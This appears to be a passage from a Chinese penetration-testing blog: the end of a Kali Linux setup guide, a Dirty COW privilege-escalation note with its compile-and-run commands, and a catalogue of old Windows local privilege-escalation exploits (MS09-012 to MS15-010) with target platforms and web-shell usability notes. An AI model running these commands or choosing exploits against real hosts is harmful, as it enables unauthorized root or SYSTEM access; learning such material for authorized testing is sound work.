<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alias</span> ll=<span class="string">'ls -l'</span></div><div class="line"><span class="keyword">alias</span> la=<span class="string">'ls -A'</span></div><div class="line"><span class="keyword">alias</span> l=<span class="string">'ls -CF'</span></div><div class="line"><span class="keyword">alias</span> vi=<span class="string">'vim'</span></div><div class="line"><span class="keyword">alias</span> vinet=<span class="string">'vi /etc/network/interfaces'</span></div><div class="line"><span class="keyword">alias</span> grep=<span class="string">'grep --color=auto'</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># source ~/.bashrc  编辑完以后,顺手重启下环境变量</span></div></pre></td></tr></table></figure>
<p>10,再来简单配置下vi,个人最喜欢的编辑器之一,下面的选项最多只能保证vi刚刚可以正常使用,但更多具体的配置选项还要按你自己实际的编辑习惯来,说到底只是个编辑器,怎么顺手怎么来,不用太过纠结<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi ~/.vimrc</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">syntax on           <span class="string">" 语法高亮</span></div><div class="line">autocmd InsertLeave * se nocul  " 用浅色高亮当前行</div><div class="line">autocmd InsertEnter * se cul    <span class="string">" 用浅色高亮当前行</span></div><div class="line">set ruler           " 显示标尺</div><div class="line">set showcmd         <span class="string">" 输入的命令显示出来，看的清楚些</span></div><div class="line">"自动保存</div><div class="line">set autowrite</div><div class="line">set ruler                   <span class="string">" 打开状态栏标尺</span></div><div class="line">set cursorline              " 突出显示当前行</div><div class="line">set magic                   <span class="string">" 设置魔术</span></div><div class="line">set guioptions-=T           " 隐藏工具栏</div><div class="line">set guioptions-=m           <span class="string">" 隐藏菜单栏</span></div><div class="line">" 不要使用vi的键盘模式，而是vim自己的</div><div class="line">set nocompatible</div><div class="line"><span class="string">" 去掉输入错误的提示声音</span></div><div class="line">set noeb</div><div class="line">" 在处理未保存或只读文件的时候，弹出确认</div><div class="line">set confirm</div><div class="line"><span class="string">" 自动缩进</span></div><div class="line">set autoindent</div><div class="line">set cindent</div><div class="line">" Tab键的宽度</div><div class="line">set tabstop=<span class="number">4</span></div><div class="line"><span class="string">" 统一缩进为4</span></div><div class="line">set softtabstop=4</div><div class="line">set shiftwidth=4</div><div class="line">" 不要用空格代替制表符</div><div class="line">set noexpandtab</div><div class="line"><span class="string">" 在行和段开始处使用制表符</span></div><div class="line">set smarttab</div><div class="line">" 显示行号</div><div class="line">set number</div><div class="line"><span class="string">" 历史记录数</span></div><div class="line">set history=1000</div><div class="line">"禁止生成临时文件</div><div class="line">set nobackup</div><div class="line">set noswapfile</div><div class="line"><span class="string">"搜索忽略大小写</span></div><div class="line">set ignorecase</div><div class="line">"搜索逐字符高亮</div><div class="line">set hlsearch</div><div class="line">set incsearch</div></pre></td></tr></table></figure>
<p>vi 配置完以后的编辑效果,如下:<br><img src="/img/vi_config.png" alt="vi"><br></p>
<p>11,开启系统的路由转发功能,很多工具运行时需要开启此功能,所以这儿就直接提前把它打开<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/sysctl.conf</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net.ipv4.ip_forward=<span class="number">1</span></div></pre></td></tr></table></figure>
<p>12,现在该配置下浏览器了,把浏览器上的各种图标能隐藏起来的都隐藏起来吧(乱七八糟的图标占地方),越简洁越好,反正我们要看的是主体内容,平时用不到的一些功能尽量把它都收起来,省的占页面,浏览历史设置为,’从来不记住’,burpsuite的默认代理也提前设置好,安装一些常用的插件,仍然只是随便给几个参考,大家平时喜欢用什么装什么即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">hackbar</div><div class="line">firebug</div><div class="line">downthemall</div><div class="line">noscript</div><div class="line">tamper data</div><div class="line">nodirect</div></pre></td></tr></table></figure></p>
<p><img src="/img/firoxo_plugins.png" alt="firefox"><br></p>
<p>13,粗略的配置下shell终端<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">修改成自己喜欢的终端字体字号,关键是方便自己看就行</div><div class="line">让终端以真正的shell程序来运行</div><div class="line">选择自己喜欢的配色方案</div><div class="line">添加所有中文简体字符集防止中文乱码</div></pre></td></tr></table></figure></p>
<p>14,解压rockyou字典,有时候可能会用到,反正自己很少用<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># cd /usr/share/wordlists/</span></div><div class="line"><span class="comment"># gunzip rockyou.txt.gz</span></div></pre></td></tr></table></figure></p>
<p>15,配置java jdk,不建议使用系统默认的Openjdk<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf jdk-7u45-linux-i586.tar.gz</span></div><div class="line"><span class="comment"># mv jdk1.7.0_45/ /opt/</span></div><div class="line"><span class="comment"># cd /opt/jdk1.7.0_45/</span></div><div class="line"><span class="comment"># update-alternatives --install /usr/bin/java java /opt/jdk1.7.0_45/bin/java 1</span></div><div class="line"><span class="comment"># update-alternatives --install /usr/bin/javac javac /opt/jdk1.7.0_45/bin/javac 1</span></div><div class="line"><span class="comment"># update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdk1.7.0_45/jre/lib/i386/libnpjp2.so 1</span></div><div class="line"><span class="comment"># update-alternatives --set java /opt/jdk1.7.0_45/bin/java</span></div><div class="line"><span class="comment"># update-alternatives --set javac /opt/jdk1.7.0_45/bin/javac</span></div><div class="line"><span class="comment"># update-alternatives --set mozilla-javaplugin.so /opt/jdk1.7.0_45/jre/lib/i386/libnpjp2.so</span></div><div class="line"><span class="comment"># java -version</span></div><div class="line"><span class="comment"># javac</span></div></pre></td></tr></table></figure></p>
<p>16,安装各种压缩解压工具<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get install unrar unace rar unrar p7zip zip unzip p7zip-full p7zip-rar file-roller -y</span></div></pre></td></tr></table></figure></p>
<p>17,安装tor服务(不自启动为好)和remmina远程桌面工具<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get install tor -y</span></div><div class="line"><span class="comment"># apt-get install remmina -y</span></div></pre></td></tr></table></figure></p>
<p>18,检查各种预装的服务,启动运行是否都正常,所有的服务默认都是不会自启动的,也不建议让它自启动,永远谨记,’最少的服务,最多的安全’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /etc/init.d/apache2 start</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /etc/init.d/mysql start</span></div><div class="line"><span class="comment"># mysql -uroot -p   我们发现最新版的kali,已经把MySQL换成了MariaDB,其实对于使用者来说几乎没有任何区别,归根结底还是原班人马打造</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /etc/init.d/postgresql start</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /etc/init.d/ssh start</span></div><div class="line">PermitRootLogin yes 允许root可以远程登录,最好顺便把ssh的默认端口也改下,root密码,我就不说什么了,大家都懂</div><div class="line"><span class="comment"># /etc/init.d/ssh restart</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netstat -tulnp  最后,看下各种服务端口都起来没</span></div></pre></td></tr></table></figure>
<p>19,简单配置proxychains,注释掉原来默认的那个sock4代理,新增下面的代理,至于要代理的端口,你自己随意,只要不跟系统现有端口冲突即可,内网渗透可能经常用到,所以我在这里还是直接先把它配好,另外注意,类型选择 ‘random_chain’ 随机代理<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/proxychains.conf</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socks5 <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">0</span> <span class="number">1000</span></div></pre></td></tr></table></figure>
<p>20,检查各种工具启动运行时是否正常<br>msf:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfconsole</span></div><div class="line"><span class="comment"># msfdb init  </span></div><div class="line">armitage</div></pre></td></tr></table></figure></p>
<p><img src="/img/armitage.png" alt="msf"><br></p>
<p>beef:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># cd /usr/share/beef-xss/</span></div><div class="line"><span class="comment"># vi config.yaml</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">credentials:</span></div><div class="line">	<span class="symbol">user:</span>   <span class="string">"klion"</span></div><div class="line">	<span class="symbol">passwd:</span> <span class="string">"admin!@#45"</span></div><div class="line"><span class="symbol">metasploit:</span></div><div class="line">	<span class="symbol">enable:</span> <span class="literal">true</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># cd extensions/metasploit/</span></div><div class="line"><span class="comment"># vi config.yaml  修改回连地址</span></div><div class="line"><span class="comment"># cd ../../</span></div><div class="line">msf &gt; load msgrpc ServerHost=<span class="number">192.168</span>.<span class="number">3.5</span> User=msf Pass=abc123</div><div class="line"><span class="comment"># ./beef -x</span></div></pre></td></tr></table></figure>
<p><img src="/img/beef_test.png" alt="beef"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># responder</span></div><div class="line"><span class="comment"># commix -h</span></div><div class="line"><span class="comment"># wpscan --update</span></div><div class="line"><span class="comment"># hydra -h</span></div><div class="line"><span class="comment"># medusa -h</span></div><div class="line"><span class="comment"># weevely -h</span></div><div class="line"><span class="comment"># sqlmap --version</span></div><div class="line"><span class="comment"># tcpdump -h</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">burpsuite:</span></div></pre></td></tr></table></figure>
<p>maltego:<br><img src="/img/maltegose.png" alt="maltego"><br><br>其它更多的工具,这里就不一一测了,大家可以捡一些自己常用的测……<br></p>
<p>21,安装一些额外工具<br>安装配置nessus,去官网下载最新版的nessus deb包,然后解压安装该包,安装过程中如果没什么问题就可以启动nessus服务了,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># dpkg -i Nessus-6.10.5-debian6_i386.deb</span></div><div class="line"><span class="comment"># /etc/init.d/nessusd start</span></div></pre></td></tr></table></figure></p>
<p>而后访问 <a href="https://127.0.0.1:8834" target="_blank" rel="external">https://127.0.0.1:8834</a> 它会进行一些简单的初始化操作,如,创建登录用户,输入激活码,最后下载更新数据,跳出登录界面,进入nessus控制台,注意浏览器在此时不要使用使用代理,否则会更新出错,如果更新出错,可再使用下面的命令手动更新:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /opt/nessus/sbin/nessuscli update</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ness_test.png" alt="nessus"><br></p>
<p>安装配置openvas:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get install openvas   安装openvas,此期间的过程非常的漫长,务必要保持网络畅通,耐心等待</span></div><div class="line"><span class="comment"># openvas-setup    			自动配置下载各种插件   </span></div><div class="line"><span class="comment"># openvas-check-setup       检查安装是否成功,看到所有的检测项ok,最后提示'it seems *** ok',即表示安装成功</span></div><div class="line"><span class="comment"># openvasmd --user admin --new-password admin123 创建登陆账号和密码</span></div><div class="line"><span class="comment"># openvas-feed-update       更新插件</span></div><div class="line"><span class="comment"># openvas-start   			启动openvas服务</span></div><div class="line"><span class="comment"># openvas-stop				关闭openvas服务,注意,启动关闭时可能都会比较慢,正常,因为要加载很多插件</span></div><div class="line">访问<span class="symbol">:https</span><span class="symbol">://</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">9392</span> 用刚刚创建的用户登陆openvas控制台即可</div></pre></td></tr></table></figure></p>
<p><img src="/img/oepnvas_test.png" alt="vpn"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /lib/systemd/system/greenbone-security-assistant.service  编辑该配置文件,把里面的--listen=127.0.0.1 改成0.0.0.0 默认只允许本地登陆,改成任意地址登陆</span></div><div class="line"><span class="comment"># systemctl daemon-reload </span></div><div class="line"><span class="comment"># openvas-start</span></div></pre></td></tr></table></figure>
<p>顺手再装几个外部工具,都是我自己会用到的一些,如果你觉得不适合自己,就忽略掉吧<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get install zmap masscan mitmf bettercap</span></div></pre></td></tr></table></figure></p>
<p>22,稍微清理一下系统,就差不多可以收工了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># history -cw</span></div><div class="line"><span class="comment"># apt-get autoclean</span></div></pre></td></tr></table></figure></p>
<p><br></p>
<p>23,关闭虚拟机,点击虚拟机设置,点击’清理磁盘’<br><img src="/img/pen_vmare_test.png" alt="vm"><br></p>
<p>将硬盘设置为 ‘独立’ ‘非永久’,一定要记得,重要数据提前备份好,莫怪怪我没提醒,一旦关机,砸电脑也于事无补,我已经被伤过,希望大家千万别再踏我踏过的坑,有些代价实在承受不起<br><img src="/img/stat_zanshi.png" alt="vm"><br><br><br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;至此,一个相对符合我们自己操作习惯的’干净’的渗透系统就基本部署完成了,至于后面还有很多各种各样的工具脚本,当我们用到时,再单独装就可以了,强烈建议不要一开始就把系统搞的特别臃肿,用什么开什么就好了,不用的时候全部关掉,尽可能的节省系统资源做更多的事情,大家可能注意到,我从始至终都没有执行过’apt-get upgrdae’ 来更新系统,当然,这并不是因为我下的就是最新版的(通常这时候更新也是最少的,这也正是我为什么选择在这个时候部署系统的主要原因),其实,对于渗透来讲,我们并不一定什么都必须要是最新的,相反,我们要的更多可能是实用和稳定,如果连这两点最基本的条件都不能保证,尤其对于一个渗透系统来讲,那就太可悲了,因为实际渗透中,我们可能并没有太多时间会花在解决系统自身的问题上,另外,还是那句话,强烈不建议隔一段时间就大规模更新系统,这样做的后果很可能会破坏掉系统原有的工具架构,尤其是一些依赖库版本的问题,最后可能导致的结果往往就是各种工具在运行时总是出现这样或那样的异常甚至不停报错,系统在第一次全部部署完成后,后续尽量就不要再进行大规模的更新,只要不是爆了很严重的,比如那种可以直接远程get到你的系统root的shell的0day,都不必太过担心,最后,因为我们部署该系统的初衷也并不是想把它作为我们的日常系统来用,所以,关于其他的一些娱乐办公方面的东西,这里不就说了,也强烈不建议把那些乱七八糟的东西都搞到系统里,很显然,这样做是非常不明智的,我们的最终目的,只是为了方便拿它来渗透,而不是装逼炫酷,所以,完全没必要把大把的时间都浪费在折腾系统上,真的不值当,只能告诉大家,东西装太多不好,是真的不好,尤其是我们很少用到的东西,除了会加重系统的负载,几乎是毫无用处,最后,再嘱咐大家一句,严禁安装flash(这个溢出王),要不然,哪一天被挂马,就尴尬了,总之一句话,用于实际渗渗透的系统尽量保持精简高效,实用和稳定即可,更具体情况还要根据大家自己的实际情况来考量,这里统统仅仅只是作为参考,大家如果真的有很熟练的LFS能力,完全可以尝试自己去构建一个渗透发行版,像我这种搓逼,就只能用centos最小化或者在ubuntu[主要是看着舒服]上搞搞了……总之,祝大家好运吧！<br><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2017/04/22/dirty/">
                linux 溢出提权小记
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2017-04-22</span>
            
            
            
                <span class="category">
                    <a href="/categories/exp/">exp</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记:</div><div class="line">实际渗透成功率相对来讲还是蛮高的,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </div><div class="line"></div><div class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">$ ./dirty admin</div><div class="line">$ su firefart</div><div class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd</span></div><div class="line"><span class="comment"># exit</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/dirty priv.png" alt="&#39;&#39;"><br></p>
<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;另外还有一些比较经典的linux提权exp,后期有空会慢慢推上来</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2017/04/22/win-0day-privilege/">
                windows 溢出提权小记
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2017-04-22</span>
            
            
            
                <span class="category">
                    <a href="/categories/exp/">exp</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h5 id="平时用的相对比较多-自己就顺手记录了一份-不大完整-关键是大家能用上就好-都是一些已知的windows-0day-exp-关于各个漏洞的详情-请自行查阅微软安全公告-链接如下"><a href="#平时用的相对比较多-自己就顺手记录了一份-不大完整-关键是大家能用上就好-都是一些已知的windows-0day-exp-关于各个漏洞的详情-请自行查阅微软安全公告-链接如下" class="headerlink" title="平时用的相对比较多,自己就顺手记录了一份,不大完整,关键是大家能用上就好,都是一些已知的windows 0day exp,关于各个漏洞的详情,请自行查阅微软安全公告,链接如下:"></a>平时用的相对比较多,自己就顺手记录了一份,不大完整,关键是大家能用上就好,都是一些已知的windows 0day exp,关于各个漏洞的详情,请自行查阅微软安全公告,链接如下:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/technet.microsoft.com/zh</span>-cn/library/security/dn639106.aspx</div></pre></td></tr></table></figure>
<h5 id="具体exp如下"><a href="#具体exp如下" class="headerlink" title="具体exp如下:"></a>具体exp如下:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">RPCSS服务没有正确地隔离NetworkService或LocalService帐号下运行的进程,本地攻击者可以利用令牌劫持的方式获得权限提升</div><div class="line">漏洞代号: MS09-<span class="number">012</span></div><div class="line">补丁编号: KB952004</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 针对<span class="number">03</span>以下系统,菜刀可用</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/churrasco.jpg" alt=""><br><br><img src="/img/pr.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">WebDAV extension <span class="keyword">for</span> IIS 处理 HTTP 请求的方式中存在一个特权提升漏洞,攻击者可能通过创建特制的匿名 HTTP 请求以访问通常需要身份验证的位置来利用此漏洞</div><div class="line">漏洞代号: MS09-<span class="number">020</span></div><div class="line">补丁编号: KB970483</div><div class="line">exp 用途: IIS <span class="number">5</span>.x ,<span class="number">6</span>.x 本地提权 </div><div class="line">适应平台: 只针对 iis5.x <span class="number">6</span>.x,菜刀可用</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/IIS 5 6.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">常规内核级漏洞</div><div class="line">漏洞代号: MS1<span class="number">0</span>-<span class="number">015</span></div><div class="line">补丁编号: KB977165</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: <span class="number">03</span> <span class="number">32</span>位系统本地测试成功,08 <span class="number">64</span>位上并未成功(<span class="number">32</span>的应该可以),在msf中已经直接提供该exp</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">win32k.sys  内核级漏洞</div><div class="line">漏洞代号: MS1<span class="number">0</span>-<span class="number">04</span>8</div><div class="line">补丁编号: KB2160329</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: <span class="number">03</span>(<span class="number">32</span>),08(<span class="number">64</span>)本地测试成功,菜刀中执行还有点儿问题,需要调下exp</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms10 048 x86_1.jpg" alt=""><br><br><img src="/img/ms10 048 x86_2.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">辅助功能驱动程序中的漏洞导致的提权</div><div class="line">漏洞代号: MS11-<span class="number">046</span></div><div class="line">补丁编号: KB2503665</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: <span class="number">03</span>(<span class="number">32</span>)菜刀可用,08以后可能不太好使,应该是exp兼容性的原因</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms 11 046.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">辅助功能驱动程序中的漏洞导致的提权</div><div class="line">漏洞代号: MS11-08<span class="number">0</span></div><div class="line">补丁编号: KB2592799</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: <span class="number">03</span>本地测试成功,08以后的系统貌似也不太好使</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Microsoft Windows用户态调度机制特权提升漏洞</div><div class="line">漏洞代号:  MS12-<span class="number">042</span></div><div class="line">补丁编号: KB2707511</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 08 r2 <span class="number">64</span>位本地测试成功,只适合win7 <span class="keyword">or</span> <span class="number">2008</span>,有可能会蓝屏,exp不太稳定</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms12 042.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Microsoft Windows DirectX图形内核本地权限提升漏洞</div><div class="line">漏洞代号: MS13-<span class="number">046</span></div><div class="line">补丁编号: KB2829361</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 适合win <span class="number">7</span> <span class="number">8</span> <span class="number">2008</span> <span class="number">2008</span>R2,本地未测试</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">win32k.sys内存对象处理本地信息泄漏漏洞</div><div class="line">漏洞代号: MS13-<span class="number">053</span></div><div class="line">补丁编号: KB2850851</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: <span class="number">03</span> r2 <span class="number">32</span>位本地测试成功,不太稳定,<span class="number">64</span>位系统全部未成功</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms13 053.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Win32k.sys CVE-<span class="number">2014</span>-<span class="number">4113</span>特权提升漏洞</div><div class="line">漏洞代号: MS14-<span class="number">05</span>8</div><div class="line">补丁编号: KB3000061</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 08 以后的系统基本都可以,exp写的很不错,成功率非常高</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<p><img src="/img/ms 14 058.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">域内提权好帮手</div><div class="line">漏洞代号: MS14-<span class="number">06</span>8</div><div class="line">补丁编号: KB301178<span class="number">0</span></div><div class="line">exp 用途: 域内提权</div><div class="line">适应平台: 暂时只找到py版</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">内核提权</div><div class="line">漏洞代号: MS15-<span class="number">010</span></div><div class="line">补丁编号: KB303622<span class="number">0</span></div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 本地未测成功,可能需要某些库支持</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
